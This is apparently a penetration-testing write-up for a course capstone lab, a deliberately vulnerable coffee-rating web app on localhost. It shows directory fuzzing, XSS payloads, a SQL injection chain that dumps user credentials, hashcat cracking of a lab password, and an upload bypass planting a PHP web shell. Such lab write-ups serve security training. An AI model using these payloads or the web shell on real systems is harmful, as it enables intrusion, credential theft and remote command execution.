## Capstone
- Small app with some login functionality, view different coffee, add ratings, etc.
- Objective: Pen test the app
- This is not about finding a single critical vulnerability
- This is about finding all impactful vulnerabilities

### Normal App Functionality
- Click "View" or "Add rating" to see coffee details
- Coffee ID is shown in URL
- Adding a rating requires to be logged in
- Try logging in with `user` and `pass`
- App says "Login failed!", which is included in the URL
- Try signing up with `user` and `pass`
- App says "You successfully signed up! Please log in.", also in URL
- Login with `user` and `pass`
- App says "You successfully logged in!", in URL
- Add a comment to a coffee
- App says "Rating submitted successfully."
- Customer rating is adjusted and the comment is displayed
- Log out and app says "You are now logged out!", in URL

### User Input Locations
- Sign up
- Log in
- Add rating
- URL Message
- URL Coffee ID

### Enumeration
- Run `ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php -recursion`

  ![image](https://github.com/user-attachments/assets/e0cbf4d1-ef9e-4269-ab1d-ca05a7775ca4)

- Notice the `/admin/admin.php` endpoint


### Add Rating:
  - Enter `<h1>test</h1>` and the app shows a header "test" as a comment
  - Enter `<marquee onstart="alert(1)">XSS</marquee>` and the app shows "XSS" as a marquee
  - This is stored XSS

  ![Screenshot 2025-01-08 005553](https://github.com/user-attachments/assets/701012e7-02ac-4146-b066-82247d5e3ba3)

### URL Message:
- Change the message in `php?message=You successfully logged in!` to `test` and app says "test"
- Change message to `<h1>test</h1>` and the app shows a header "test"
- Change message to `<marquee onstart="alert(1)">XSS</marquee>` and the app shows "XSS" as a marquee
- This is reflected XSS

  ![Screenshot 2025-01-08 005739](https://github.com/user-attachments/assets/536ba7a8-3959-4f27-9042-b9ea9affb371)

### URL Coffee ID
- Change the coffee id to `' or 1=1-- -` and the app shows all the coffees' details
- Change the coffee id to `' union select null,null,null,null,null,null,null-- -` and the app shows an empty coffee details
- Replace the second `null` to `'string'` to change the coffee name to `string`
- Replace `string` with `version()` to see the database version
- Replace `version()` with `table_name` and append ` from information_schema.tables` to the last null to see all the table names
- Replace 'table` with `column` and `tables` to see all the columns
- Replace `column_name` with `username`, the null after to `password`, and `information_schema.columns` with `users` to see all the usernames and passwords
- This is SQli

  ![image](https://github.com/user-attachments/assets/328d1006-3eae-41c8-92e9-75e1ac1bbfd1)

### Password Cracking
- The `$2` indicates the hashes are blowfish
- Copy a couple hashes and paste them into a file named 'hashes`
- Run `hashcat -m 3200 hashes /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt`
- Hashcat cracked jeremy's password

  ![image](https://github.com/user-attachments/assets/5bb3201c-5c0f-42ed-8ce4-9a4bafe21cda)

### Admin
- Login with `jeremy` and `capatain1`
- Navigate to `/admin/admin.php` (from FFuf enumeration)
- Add new coffee page
- Includes a file upload for the coffee image
- Send request to repeater
- Remove most of the image data
- Enter `<?php system($_GET['cmd']); ?>` after some image data
- Change the file extension to `.php`
- Go to the home page and right click on where the image for the coffee should be and click open image in new tab
- Replace `png` with `.php?cmd=whoami`

  ![image](https://github.com/user-attachments/assets/615d6b26-6503-4f24-af25-e1ffaa7eee67)











